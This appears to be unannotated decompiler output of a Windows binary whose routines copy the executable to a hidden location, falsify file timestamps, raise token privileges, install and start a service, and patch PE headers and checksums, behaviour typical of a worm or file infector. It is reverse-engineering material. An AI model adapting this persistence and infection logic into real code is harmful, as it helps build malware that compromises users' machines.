	*(fp - 0x0440) = 0x00;
	*(fp - 0x0444) = fp - 0x020C;
	*(fp - 0x0448) = 0x00;
	*(fp - 1100) = fp - 0x0108;
	Eq_2 ecx_63 = fn004078BB(ecx_50, dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10);
	*(fp - 0x0450) = fp - 0x020C;
	*(fp - 0x0454) = fp - 0x0414;
	word32 eax_74 = 0x00 - (-fn0040C920(ecx_63, dwArg00, dwArg04) == 0x00);
	word32 esi_76;
	*esiOut = *(fp - 0x0424);
	return eax_74 + 0x01;
}

// 00404CC5: Register ui32 fn00404CC5(Stack Eq_1444 dwArg04, Stack uint32 dwArg08)
ui32 fn00404CC5(Eq_1444 dwArg04, uint32 dwArg08)
{
	if (dwArg08 >= 0x44 && (*dwArg04 == 77 && *((word32) dwArg04 + 0x01) == 0x5A))
	{
		word32 * eax_41 = (word32) dwArg04 + (word32) (*((word32) dwArg04 + 0x003C));
		uint32 edx_44 = eax_41 - dwArg04;
		if (edx_44 <= dwArg08 + ~0x03)
			return ~(0x00 - (0x4550 - *eax_41 == 0x00)) & edx_44;
	}
	return 0x00;
}

// 00404D04: Register Eq_2658 fn00404D04(Stack Eq_1444 dwArg04, Stack uint32 dwArg08, Stack uint32 dwArg0C)
Eq_2658 fn00404D04(Eq_1444 dwArg04, uint32 dwArg08, uint32 dwArg0C)
{
	Eq_2658 eax_39;
	ptr32 eax_23 = fn00404CC5(dwArg04, dwArg0C);
	if (eax_23 != 0x00)
	{
		struct Eq_2670 * ecx_61 = (word32) dwArg04 + eax_23;
		uint32 edx_65 = ecx_61->dw0074;
		if (edx_65 >= dwArg08)
		{
			uint32 ecx_69 = (word32) ecx_61->w0006;
			uint32 esi_70 = ecx_61->a0070[dwArg08].dw0000;
			uint32 edi_100 = 0x00;
			eax_39 = (char *) (&ecx_61->dw0074 + 0x03 + (edx_65 * 0x08) / 0x0078) + 0x04;
			if (true)
			{
				do
				{
					if (eax_39 - dwArg04 >= dwArg0C + ~0x03)
						goto l00404D6D;
					uint32 edx_88 = *eax_39;
					if ((word32) *eax_39 + edx_88 > esi_70 && edx_88 <= esi_70)
						break;
					eax_39 = (word32) eax_39 + 0x0028;
					edi_100 = edi_100 + 0x01;
				} while (edi_100 < ecx_69);
				if (edi_100 < ecx_69)
					return eax_39;
			}
		}
	}
l00404D6D:
	eax_39.u0 = 0x00;
	return eax_39;
}

// 00404FC5: void fn00404FC5(Register ptr32 ebp, Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
void fn00404FC5(ptr32 ebp, Eq_2 dwArg04, Eq_2 dwArg08)
{
	fn0040174B();
	word32 ecx_28;
	word32 ebx_29;
	Eq_1444 esi_30;
	word32 edi_31;
	Eq_1444 eax_32 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_28, out ebx_29, out esi_30, out edi_31);
	if (eax_32 == esi_30)
		return;
	ptr32 eax_76 = fn00404CC5(eax_32, dwLoc08);
	if (eax_76 != 0x00)
	{
		struct Eq_2747 * eax_141 = fn00404D04(eax_32, 0x03, dwLoc08);
		if (eax_141 != null)
		{
			struct Eq_2754 * esi_148 = (word32) eax_32 + eax_76;
			esi_148->dw008C = 0x10;
			uint32 ecx_152 = eax_141->dw0004;
			eax_141->dw0000 = 0x10;
			eax_141->dw0008 = 0x10;
			ui32 ecx_153 = ecx_152 + 0x10;
			if (((word16) (ecx_152 + 0x10) & 0x0FFF) != 0x00)
				ecx_153 = (ecx_152 + 0x10 >> 0x0C) + 0x01 << 0x0C;
			esi_148->dw0050 = ecx_153;
			word32 ecx_162 = eax_141->dw000C;
			Eq_2 edi_165 = eax_141->dw0008 + ecx_162;
			cui16 di_166 = (word16) edi_165;
			if (edi_165 < dwArg08)
				di_166 = (word16) dwArg08;
			Eq_2 eax_176 = (word32) eax_32 + ecx_162;
			if (eax_176 - eax_32 < 0x10)
				fn004076F0(eax_176, 0x00, 0x10);
			word32 eax_187 = esi_148->dw00EC;
			if (eax_187 != 0x00)
				esi_148->dw0028 = eax_187;
l0040508E:
			word32 edi_97;
			if (fn00401808(fp - 0x18, out edi_97) != 0x00)
			{
				*(fp - 0x28) = edi_97;
				*(fp - 44) = (union Eq_2 *) dwArg04;
				word32 esi_119;
				fn0040406E(dwArg00, dwArg04, out esi_119);
			}
			*(fp - 0x28) = (union Eq_2 *) dwArg04;
			fn00405108(dwArg00);
			return;
		}
	}
	goto l0040508E;
}

// 004050B5: Register uint32 fn004050B5(Stack Eq_1444 dwArg04, Stack uint32 dwArg08)
uint32 fn004050B5(Eq_1444 dwArg04, uint32 dwArg08)
{
	uint32 ecx_11 = 0x00;
	uint32 dwLoc08_16 = 0x00;
	if (dwArg08 >> 0x01 != 0x00)
	{
		Eq_1444 edx_43 = dwArg04;
		uint32 esi_47 = dwArg08 >> 0x01;
		do
		{
			uint32 ecx_53 = ecx_11 + (word32) (*edx_43);
			ecx_11 = (ecx_53 & 0xFFFF) + (ecx_53 >> 0x10);
			edx_43 = (word32) edx_43 + 0x02;
			esi_47 = esi_47 - 0x01;
		} while (esi_47 != 0x00);
		dwLoc08_16 = ecx_11;
	}
	uint32 eax_28 = ecx_11 >> 0x10;
	return DPB(eax_28, (word16) eax_28 + (word16) dwLoc08_16, 0) + dwArg08;
}

// 00405108: void fn00405108(Stack Eq_2 dwArg04)
void fn00405108(Eq_2 dwArg04)
{
	fn0040174B();
	word32 ecx_32;
	word32 ebx_33;
	word32 esi_34;
	word32 edi_35;
	Eq_1444 eax_36 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_32, out ebx_33, out esi_34, out edi_35);
	if (eax_36 != 0x00)
	{
		ptr32 eax_63 = fn00404CC5(eax_36, dwLoc08 & 0x00);
		if (eax_63 != 0x00)
		{
			ui32 * esi_84 = (word32) eax_36 + (eax_63 + 88);
			if (*((word32) eax_36 + (eax_63 + 88)) != 0x00)
			{
				*esi_84 = *esi_84 & 0x00;
				*esi_84 = fn004050B5(eax_36, dwLoc08 & 0x00);
			}
		}
		word32 edi_79;
		fn00401808(fp - 0x18, out edi_79);
	}
}

// 00405449: Register word32 fn00405449(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
word32 fn00405449(Eq_2 dwArg04, Eq_2 dwArg08)
{
	Eq_2 eax_17 = dwArg04;
	if (dwArg04 == 0x00)
		eax_17 = GetCurrentProcess();
	word32 * esp_144 = fp - 0x0674;
	if (OpenProcessToken(eax_17, 0x28, fp + 0x04) != 0x00)
	{
		ptr32 esp_105 = fp - 0x0688;
		if (LookupPrivilegeValueA(0x00, dwArg08, fp - 0x10) != 0x00)
		{
			AdjustTokenPrivileges(dwArg04, 0x00, fp - 0x24, 0x10, fp - 0x0664, fp - 0x14);
			esp_105 = fp - 0x06A0;
			if (GetLastError() == 0x00)
			{
				AdjustTokenPrivileges(dwArg04, 0x00, fp - 0x0664, 0x10, null, null);
				esp_105 = fp - 0x06B8;
			}
		}
		union Eq_2 * esp_137 = esp_105 - 0x04;
		*esp_137 = (union Eq_2 *) dwArg04;
		CloseHandle(*esp_137);
		esp_144 = (word32 *) ((char *) esp_137 + 0x08);
	}
	return *esp_144;
}

// 00405522: Register word32 fn00405522(Register ptr32 ebp, Stack Eq_2 dwArg04)
word32 fn00405522(ptr32 ebp, Eq_2 dwArg04)
{
	struct Eq_3048 * esp_191 = fp - 0x40;
	Eq_2 eax_31 = CreateFileA(dwArg04, 0xC0000000, 0x01, null, 0x03, 0x20, 0x00);
	if (eax_31 != 0x00)
	{
		GetSystemTime(fp - 0x1C);
		fn004047B6(0x00);
		if (wLoc14 - (word16) ((uint32) ((uint64) ((uint32) fn004047B6(0x00)) % 0x18)) <= 0x00)
			wLoc16 = wLoc16 - 0x01;
		ptr32 esp_133 = fp - 0x50;
		if (wLoc16 - (word16) ((uint32) ((uint64) ((uint32) fn004047B6(0x00)) % 0x1C)) <= 0x00)
		{
			fn004047B6(0x00);
			esp_133 = fp - 0x54;
		}
		word32 * esp_146 = esp_133 - 0x04;
		*esp_146 = 0x00;
		uint64 edx_eax_154 = (uint64) (uint32) fn004047B6(dwArg00);
		*(esp_146 - 0x04) = 0x0C;
		*(esp_146 - 0x04) = fp - 0x0C;
		*(esp_146 - 0x08) = fp - 0x1C;
		SystemTimeToFileTime(*(esp_146 - 0x08), *(esp_146 - 0x04));
		*(esp_146 - 0x0C) = fp - 0x0C;
		*(esp_146 - 0x10) = fp - 0x0C;
		*(esp_146 - 0x14) = fp - 0x0C;
		*(esp_146 - 0x18) = (union Eq_2 *) eax_31;
		SetFileTime(*(esp_146 - 0x18), *(esp_146 - 0x14), *(esp_146 - 0x10), *(esp_146 - 0x0C));
		*(esp_146 - 0x1C) = (union Eq_2 *) eax_31;
		CloseHandle(*(esp_146 - 0x1C));
		esp_191 = esp_146 - 0x1C;
	}
	return esp_191->dw0004;
}

// 004055FE: Register word32 fn004055FE(Register ptr32 ebp, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn004055FE(ptr32 ebp, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	fn004047B6(0x01);
	fn004076F0(4798444, 0x00, 0x0104);
	fn004076F0(4798184, 0x00, 0x0104);
	fn004076F0(4797924, 0x00, 0x0104);
	fn004076F0(4797664, 0x00, 0x0104);
	fn004076F0(4797404, 0x00, 0x0104);
	fn00403634(0x0040F0D4, 0x2266, &globals->t40F0D0, 0x00);
	word32 esi_75;
	Eq_2 edi_76;
	Eq_2 ebx_77 = fn00402680(&globals->t4938F8, out esi_75, out edi_76);
	Eq_2 eax_79 = GetVersion();
	globals->t493900 = edi_76;
	globals->t4938F0 = eax_79 & 0x80000000;
	GetVersionExA(fp - 0x98);
	if (dwLoc94 == 0x05 && dwLoc90 == ebx_77)
		globals->t493900 = ebx_77;
	word32 eax_105;
	fn00404A18(ebx_77, fp - 0x04, esi_75);
	*(fp - 0xB0) = 0x0007D000;
	word32 ebx_95;
	word32 esi_96;
	byte * edi_97;
	byte * eax_98 = fn00407F8F(fp - 0x04, dwArg00, out ebx_95, out esi_96, out edi_97);
	globals->ptr4933D8 = eax_98;
	if (eax_98 == edi_97)
		eax_105 = 0x00;
	else
	{
		*(fp - 0xB0) = esi_96;
		*(fp - 0xB4) = (byte **) edi_97;
		*(fp - 0xB8) = (byte **) eax_98;
		fn004076F0(dwArg00, bArg04, dwArg08);
		word32 ebp_132;
		word32 edi_133;
		*(fp - 188) = fn004057BE(ebx_95, out ebp_132, out edi_133);
		*(fp - 0xC0) = 0x00410E04;
		*(fp - 0xC4) = (union Eq_2 *) fn0040347E(dwArg00, dwArg04);
		*(fp - 200) = edi_133;
		eax_105 = fn00405449(dwArg00, dwArg04);
	}
	word32 edi_110;
	*ediOut = *(fp - 0xAC);
	word32 esi_112;
	*esiOut = *(fp - 0xA8);
	word32 ebx_114;
	*ebxOut = *(fp - 0xA4);
	return eax_105;
}

// 00405705: void fn00405705(Register ptr32 ebp, Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
void fn00405705(ptr32 ebp, Eq_2 dwArg04, Eq_2 dwArg08)
{
	fn0040174B();
	ptr32 ebp_122 = fp - 0x04;
	word32 ecx_22;
	word32 ebx_23;
	word32 esi_24;
	word32 edi_25;
	Eq_1444 eax_26 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_22, out ebx_23, out esi_24, out edi_25);
	if (eax_26 != 0x00)
	{
		uint32 esi_131 = 0x1014;
		if (dwLoc08 >= 0x1000)
		{
			Eq_2 eax_101 = fn00407840(dwArg08);
			if (dwLoc08 > 4294962200)
			{
				do
				{
					if (fn00408420(dwArg08, (word32) eax_26 + esi_131, eax_101) == 0x00)
					{
						Eq_2 edi_150 = (word32) eax_26 + (esi_131 + 0x00);
						fn00403634(edi_150, 0x2266, edi_150 - 0x04, SLICE(edi_150 - 0x04, byte, 24));
						word32 esi_169;
						word32 edi_170;
						ebp_122 = fn00407C00(edi_150, (word32) dwArg08 + 0x0014, 0x2266, out esi_169, out edi_170);
						*(fp - 0x40) = edi_150 - 0x04;
						word32 edi_174;
						word32 esi_175 = fn004035A1(esi_169, out edi_174);
						*(fp - 0x44) = edi_150 - 0x04;
						*(fp - 0x48) = esi_175;
						*(fp - 0x4C) = edi_174;
						fn004035D8(dwArg00, dwArg04, dwArg08, bArg0B);
						break;
					}
					esi_131 = esi_131 + 0x01;
				} while (esi_131 < dwLoc08 + ~0x03E7);
			}
			*(fp - 0x28) = 0x01;
		}
		word32 edi_87;
		fn00401808(ebp_122 - 0x14, out edi_87);
	}
}

// 004057BE: Register word32 fn004057BE(Register word32 ebx, Register out ptr32 ebpOut, Register out ptr32 ediOut)
word32 fn004057BE(word32 ebx, ptr32 & ebpOut, ptr32 & ediOut)
{
	ptr32 esp_195 = fp - 0x14;
	Eq_2485 eax_26 = LoadLibraryA(fn0040347E(0x00410B93, 0x02));
	if (eax_26 != null)
	{
		globals->t493908 = GetProcAddress(eax_26, fn0040347E(0x00410C93, 0x01));
		globals->t493904 = GetProcAddress(eax_26, fn0040347E(0x00410C93, 0x04));
		globals->t49390C = GetProcAddress(eax_26, fn0040347E(0x00410C93, 0x05));
		esp_195 = fp - 44;
	}
	ptr32 esp_143;
	union Eq_2 * esp_45 = esp_195 - 0x04;
	*esp_45 = (union Eq_2 *) 0x03;
	*(esp_45 - 0x04) = 0x00410B93;
	*esp_45 = (union Eq_2 *) fn0040347E(dwArg00, dwArg04);
	Eq_2485 eax_64 = LoadLibraryA(*esp_45);
	if (eax_64 != null)
	{
		*(esp_143 - 0x04) = 0x03;
		*(esp_143 - 0x08) = 0x00410C93;
		Eq_2 eax_134 = fn0040347E(dwArg00, dwArg04);
		*(esp_143 - 0x04) = (union Eq_2 *) eax_134;
		*(esp_143 - 0x08) = (HMODULE *) eax_64;
		word32 ebx_144;
		word32 ebp_145;
		word32 esi_146;
		word32 edi_147;
		word32 ecx_148;
		word32 eax_149;
		byte SZO_150;
		byte C_151;
		byte Z_152;
		esi_61();
		globals->dw493910 = eax_149;
	}
	word32 * esp_74 = esp_143 - 0x04;
	*esp_74 = 4263368;
	word32 ebx_77;
	word32 ebp_78;
	<anonymous> * esi_79;
	word32 edi_80;
	word32 ecx_81;
	word32 eax_82;
	byte SZO_83;
	byte C_84;
	byte Z_85;
	word32 * esp_119;
	ebx_59();
	if (eax_82 != 0x00)
	{
		*(esp_119 - 0x04) = 0x01;
		*(esp_119 - 0x08) = 4263368;
		Eq_2 eax_110 = fn0040347E(dwArg00, dwArg04);
		*(esp_119 - 0x04) = (union Eq_2 *) eax_110;
		*(esp_119 - 0x08) = eax_82;
		word32 ebx_120;
		word32 ebp_121;
		word32 esi_122;
		word32 edi_123;
		word32 ecx_124;
		word32 eax_125;
		byte SZO_126;
		byte C_127;
		byte Z_128;
		esi_79();
		globals->dw493914 = eax_125;
	}
	struct Eq_3668 * esp_97 = esp_119 + 0x01;
	word32 edi_96;
	*ediOut = *esp_119;
	word32 ebp_100;
	*ebpOut = esp_97->dw0004;
	return esp_97->dw0008;
}

// 00405B0F: Register word32 fn00405B0F(Register ptr32 ebp, Stack Eq_2 dwArg04, Register out ptr32 ebxOut, Register out ptr32 ediOut)
word32 fn00405B0F(ptr32 ebp, Eq_2 dwArg04, ptr32 & ebxOut, ptr32 & ediOut)
{
	word32 eax_184;
	fn0040174B();
	Eq_2 ecx_27;
	word32 ebx_28;
	word32 esi_29;
	word32 edi_30;
	Eq_1444 eax_31 = fn0040174E(fp - 0x1C, dwArg04, fp - 0x0C, 0x01, out ecx_27, out ebx_28, out esi_29, out edi_30);
	if (eax_31 != 0x00)
	{
		fn004078BB(ecx_27, dwArg04, fp - 288, fp - 808, fp - 0x042C, fp - 0x0224);
		fn00407760(fp - 288);
		*(fp - 0x0450) = fp - 0x042C;
		*(fp - 0x0454) = fp - 288;
		fn00407760(dwArg00);
		*(fp - 1112) = fp - 0x0223;
		*(fp - 1116) = fp - 288;
		fn00407760(dwArg00);
		*(fp - 0x0460) = 0x004101DC;
		*(fp - 0x0464) = fp - 288;
		fn00407760(dwArg00);
		*(fp - 1128) = fp - 0x08;
		*(fp - 1132) = dwLoc0C;
		*(fp - 0x0470) = (union Eq_1444 *) eax_31;
		if (fn0040756C(dwArg00, dwArg04, dwArg08) != 0x00)
		{
			word32 edi_145;
			word32 esi_146 = fn00401808(fp - 0x1C, out edi_145);
			*(fp - 0x0434) = dwLoc08 & 0x00;
			*(fp - 1080) = esi_146;
			*(fp - 0x043C) = fp - 288;
			word32 esi_155;
			Eq_3320 ebp_156 = fn00403DC6(dwArg00, dwArg04, dwArg08, out esi_155);
			*(fp - 0x0440) = esi_155;
			word32 ebp_159;
			word32 edi_160;
			word32 ebx_161;
			*ebxOut = fn00407BEB(ebp_156, dwArg00, out ebp_159, out edi_160);
			*(fp - 0x0434) = (union Eq_2 *) GetCommandLineA();
			*(fp - 1080) = ebp_159 - 0x011C;
			word32 esi_172;
			word32 eax_173 = fn004047E2(dwArg00, dwArg04, out esi_172);
			if (eax_173 != 0x00)
			{
				*(fp - 0x0434) = ~0x00;
				*(fp - 1080) = eax_173;
				WaitForSingleObject(*(fp - 1080), *(fp - 0x0434));
				*(fp - 0x043C) = ebp_159 - 0x011C;
				fn00403F05(dwArg00);
				*(fp - 0x043C) = 0x01;
				esi_172 = *(fp - 0x043C);
			}
			eax_184 = esi_172;
			return eax_184;
		}
		word32 edi_143;
		fn00401808(fp - 0x1C, out edi_143);
	}
	eax_184 = 0x00;
	return eax_184;
}

// 00406DFD: Register ptr32 fn00406DFD(Register word32 ebx, Register ptr32 ebp, Register word32 esi, Register word32 edi)
ptr32 fn00406DFD(word32 ebx, ptr32 ebp, word32 esi, word32 edi)
{
	fn00407F60(9092, dwLoc04);
	GetModuleFileNameA(null, fp + 0x04, 0x0104);
	SetFileAttributesA(4797924, 0x20);
	CopyFileA(fp - 0x10, 4797924, 0x00);
	SetFileAttributesA(4797924, 0x20);
	Eq_2 esi_27 = 4797924;
	ptr32 esp_306 = fp - 0x38;
	if (0x00 != 0x00)
	{
		word32 esi_274;
		word32 edi_275;
		ebp = fn00407C00(dwArg00, dwArg04, dwArg08, out esi_274, out edi_275);
		fn00405705(ebp, dwArg00, dwArg04);
		fn00404FC5(ebp, dwArg00, dwArg04);
		fn004047B6(dwArg00);
		fn0040406E(dwArg00, dwArg04, out esi_27);
		esp_306 = fp - 0x3C;
	}
	Eq_2138 ebx_244;
	word32 esi_242;
	struct Eq_4007 * esp_119;
	union Eq_2 * esp_54 = esp_306 - 0x04;
	*esp_54 = (union Eq_2 *) esi_27;
	word32 esi_57 = fn00405522(ebp, dwArg00);
	*esp_54 = (union Eq_2 *) 0x27;
	*(esp_54 - 0x04) = esi_57;
	SetFileAttributesA(*(esp_54 - 0x04), *esp_54);
	if (globals->t4938F0 != ebx_244)
	{
		*(esp_119 - 0x04) = esi_242;
		*(esp_119 - 0x08) = 4797404;
		*(esp_119 - 0x0C) = 4797664;
		*(esp_119 - 0x10) = 0x80000002;
		fn0040464B(dwArg00, dwArg04, dwArg08, dwArg0C);
		*(esp_119 - 0x14) = 0x01;
		*(esp_119 - 0x18) = 0x00410B93;
		*(esp_119 - 0x04) = (union Eq_2 *) fn0040347E(dwArg00, dwArg04);
		Eq_2485 eax_226 = LoadLibraryA(*(esp_119 - 0x04));
		*(esp_119 - 0x08) = 0x00410C93;
		*(esp_119 - 0x0C) = (HMODULE *) eax_226;
		Eq_2485 ebp_227 = eax_226;
		ptr32 esp_230 = esp_119 - 0x0C;
		Eq_2138 eax_232 = GetProcAddress(*(esp_119 - 0x0C), *(esp_119 - 0x08));
		if (eax_232 != ebx_244)
		{
			*(esp_119 - 0x10) = 0x01;
			*(esp_119 - 0x14) = (FARPROC *) ebx_244;
			eax_232();
			esp_230 = esp_119 - 0x14;
		}
		esp_119 = esp_230 - 0x04;
		esp_119->t0000 = ebp_227;
		FreeLibrary(esp_119->t0000);
	}
	if (esp_119->t0010 != ebx_244)
	{
		if (globals->t4938F0 != ebx_244)
		{
			FARPROC * esp_125 = esp_119 - 0x04;
			*esp_125 = (FARPROC *) ebx_244;
			*(esp_125 - 0x04) = esi_242;
			word32 esi_130;
			fn004047E2(dwArg00, dwArg04, out esi_130);
			esp_119 = (struct Eq_4007 *) ((char *) esp_125 + 0x04);
		}
		else if (globals->t4938F8 == ebx_244)
		{
			struct Eq_4205 * esp_139 = esp_119 - 0x04;
			esp_139->t0000.u0 = 0x02;
			*(esp_139 - 0x04) = (FARPROC *) ebx_244;
			*(esp_139 - 0x08) = (FARPROC *) ebx_244;
			Eq_4222 eax_145 = OpenSCManagerA(*(esp_139 - 0x08), *(esp_139 - 0x04), esp_139->t0000);
			*(esp_139 - 0x0C) = (FARPROC *) ebx_244;
			*(esp_139 - 0x10) = (FARPROC *) ebx_244;
			*(esp_139 - 0x14) = (FARPROC *) ebx_244;
			*(esp_139 - 0x18) = (FARPROC *) ebx_244;
			*(esp_139 - 0x1C) = (FARPROC *) ebx_244;
			*(esp_139 - 0x20) = esi_242;
			*(esp_139 - 0x24) = (FARPROC *) ebx_244;
			*(esp_139 - 0x28) = 0x02;
			*(esp_139 - 44) = 0x0110;
			*(esp_139 - 0x30) = (FARPROC *) ebx_244;
			*(esp_139 - 0x34) = 4797404;
			*(esp_139 - 0x38) = 4797404;
			*(esp_139 - 0x3C) = (SC_HANDLE *) eax_145;
			esp_139->t0008 = eax_145;
			CreateServiceA(*(esp_139 - 0x3C), *(esp_139 - 0x38), *(esp_139 - 0x34), *(esp_139 - 0x30), *(esp_139 - 44), *(esp_139 - 0x28), *(esp_139 - 0x24), *(esp_139 - 0x20), *(esp_139 - 0x1C), *(esp_139 - 0x18), *(esp_139 - 0x14), *(esp_139 - 0x10), *(esp_139 - 0x0C));
			*(esp_139 - 0x40) = *(esp_139 - 44);
			CloseServiceHandle(*(esp_139 - 0x40));
			*(esp_139 - 0x44) = 0x01;
			*(esp_139 - 0x48) = (FARPROC *) ebx_244;
			*(esp_139 - 0x4C) = (FARPROC *) ebx_244;
			Eq_4222 eax_185 = OpenSCManagerA(*(esp_139 - 0x4C), *(esp_139 - 0x48), *(esp_139 - 0x44));
			*(esp_139 - 0x50) = 0x10;
			*(esp_139 - 0x54) = 4797404;
			*(esp_139 - 88) = (SC_HANDLE *) eax_185;
			Eq_4222 eax_193 = OpenServiceA(*(esp_139 - 88), *(esp_139 - 0x54), *(esp_139 - 0x50));
			*(esp_139 - 0x5C) = (FARPROC *) ebx_244;
			*(esp_139 - 0x60) = (FARPROC *) ebx_244;
			*(esp_139 - 100) = (SC_HANDLE *) eax_193;
			StartServiceA(*(esp_139 - 100), *(esp_139 - 0x60), *(esp_139 - 0x5C));
			*(esp_139 - 0x68) = (SC_HANDLE *) eax_193;
			CloseServiceHandle(*(esp_139 - 0x68));
			*(esp_139 - 0x6C) = (SC_HANDLE *) eax_185;
			CloseServiceHandle(*(esp_139 - 0x6C));
			esp_119 = esp_139 - 0x6C;
		}
		word32 * esp_121 = esp_119 - 0x04;
		*esp_121 = 0x01;
		esp_119 = (struct Eq_4007 *) (esp_121 + 0x01);
	}
	return esp_119->ptr0008;
}

// 004071C3: void fn004071C3()
void fn004071C3()
{
	while (true)
		Sleep(~0x00);
}

// 004072F2: void fn004072F2()
void fn004072F2()
{
	CreateThread(null, 0x00, &globals->t4015FF, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406608, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406DDE, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406066, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t4071CD, 0x00, 0x00, fp - 0x08);
	CreateThread(null, 0x00, &globals->t406FD5, 0x00, 0x00, fp - 0x08);
	ptr32 esp_101 = fp - 0xA4;
	int32 ebx_104 = 0x00;
	do
	{
		union Eq_2 * esp_110 = esp_101 - 0x04;
		*esp_110 = (union Eq_2 *) (fp - 0x08);
		*(esp_110 - 0x04) = 0x00;
		*(esp_110 - 0x08) = ebx_104;
		*(esp_110 - 0x0C) = 4222856;
		*(esp_110 - 0x10) = 0x00;
		*(esp_110 - 0x14) = 0x00;
		CreateThread(*(esp_110 - 0x14), *(esp_110 - 0x10), *(esp_110 - 0x0C), *(esp_110 - 0x08), *(esp_110 - 0x04), *esp_110);
		esp_101 = esp_110 - 0x14;
		ebx_104 = ebx_104 + 0x01;
	} while (ebx_104 < 0x1A);
	fn004071C3();
}

// 004073E2: Register word32 fn004073E2(Register ptr32 ebp, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn004073E2(ptr32 ebp, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	ptr32 esp_13;
	ptr32 ebp_14;
	byte SCZO_15;
	word32 eax_16;
	byte SZO_17;
	byte C_18;
	byte Z_19;
	word32 ecx_20;
	word32 ebx_21;
	word32 esi_22;
	word32 edi_23;
	WS2_32.dll!Ordinal_115();
	word32 ebx_24;
	word32 esi_25;
	word32 edi_26;
	if (fn004055FE(ebp_14, out ebx_24, out esi_25, out edi_26) != 0x00)
	{
		ptr32 ebp_48 = fn00406DFD(ebx_24, ebp_14, esi_25, edi_26);
		if (globals->b4100D4 != 0x00)
		{
			*(esp_13 - 0x04) = 0x004100D4;
			word32 ebx_84;
			word32 edi_85;
			if (fn00405B0F(ebp_48, dwArg00, out ebx_84, out edi_85) != 0x00)
				return 0x00;
		}
		if (globals->t4938F8 != null)
		{
			*(ebp_48 - 0x08) = *(ebp_48 - 0x08) & 0x00;
			*(ebp_48 - 0x04) = *(ebp_48 - 0x04) & 0x00;
			*(ebp_48 - 0x10) = 4797404;
			*(esp_13 - 0x04) = ebp_48 - 0x10;
			*(ebp_48 - 0x0C) = 4223939;
			StartServiceCtrlDispatcherA(*(esp_13 - 0x04));
		}
		word32 ebx_61;
		word32 esi_62;
		word32 edi_63;
		if (fn00404C49(ebp_48, out ebx_61, out esi_62, out edi_63) != 0x00)
			fn004072F2();
	}
	return 0x00;
}

// 0040756C: Register (ptr byte) fn0040756C(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C)
byte * fn0040756C(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C)
{
	byte * eax_42;
	Eq_2 eax_19 = *dwArg04;
	Eq_2 edx_166 = 0x00;
	uint32 dwLoc08_176 = 0x00;
	if (dwArg08 < (eax_19 << 0x03) + 0x04)
		eax_42 = null;
	else
	{
		if (true)
		{
			struct Eq_4831 * esi_169 = (word32) dwArg04 + 0x04 + 0x04;
			Eq_2 dwArg04_170 = eax_19;
			do
			{
				Eq_2 ecx_180 = esi_169->dw0000;
				if (edx_166 < ecx_180)
				{
					word32 ecx_203 = ecx_180 - edx_166;
					edx_166 = (word32) edx_166 + ecx_203;
					dwLoc08_176 = dwLoc08_176 + ecx_203;
				}
				word32 eax_188 = esi_169->dw0000;
				if (true)
					edx_166 = (word32) edx_166 + eax_188;
				Eq_2 v15_196 = dwArg04_170 - 0x01;
				esi_169 = esi_169 + 0x01;
				dwArg04_170 = v15_196;
			} while (v15_196 != 0x00);
		}
		uint32 eax_73 = dwArg08 - (eax_19 << 0x03);
		if (dwLoc08_176 < eax_73 + ~0x03)
			edx_166 = (word32) edx_166 + ((eax_73 + ~0x03) - dwLoc08_176);
		*dwArg0C = edx_166;
		Eq_4912 dwLoc08_106[] = dwLoc08_176 & 0x00;
		word32 ebx_91;
		word32 edi_93;
		byte * esi_108;
		eax_42 = fn00407F8F(fp - 0x04, edx_166, out ebx_91, out esi_108, out edi_93);
		int32 edi_95 = edi_93 + 0x04 + ebx_91;
		Eq_2 ebx_132 = eax_19;
		if (true)
		{
			struct Eq_4888 * ecx_123 = (word32) dwArg04 + 0x04;
			do
			{
				while (esi_108 < ecx_123->dw0000)
				{
					Mem137[eax_42 + esi_108:byte] = Mem90[dwLoc08_106 + edi_95:byte];
					esi_108 = esi_108 + 0x01;
					dwLoc08_106 = (Eq_4912 (*)[]) (dwLoc08_106 + 0x01)->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000;
				}
				uint32 edx_142 = 0x00;
				if (ecx_123->dw0004 > 0x00)
				{
					do
					{
						Mem158[eax_42 + esi_108:byte] = Mem90[eax_42 + esi_108:byte] & 0x00;
						esi_108 = esi_108 + 0x01;
						edx_142 = edx_142 + 0x01;
					} while (edx_142 < ecx_123->dw0004);
				}
				ecx_123 = ecx_123 + 0x01;
				ebx_132 = ebx_132 - 0x01;
			} while (ebx_132 != 0x00);
		}
		Eq_4912 ecx_110[] = dwLoc08_106;
		if (dwLoc08_106 < eax_73 + ~0x03)
		{
			word32 esi_113 = esi_108 + eax_42;
			do
			{
				*esi_113 = (byte) (&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&(&ecx_110[edi_95].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00].a0000)[0x00];
				esi_113 = esi_113 + 0x01;
				ecx_110 = (Eq_4912 (*)[]) (ecx_110 + 0x01)->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000->a0000;
			} while (ecx_110 < eax_73 + ~0x03);
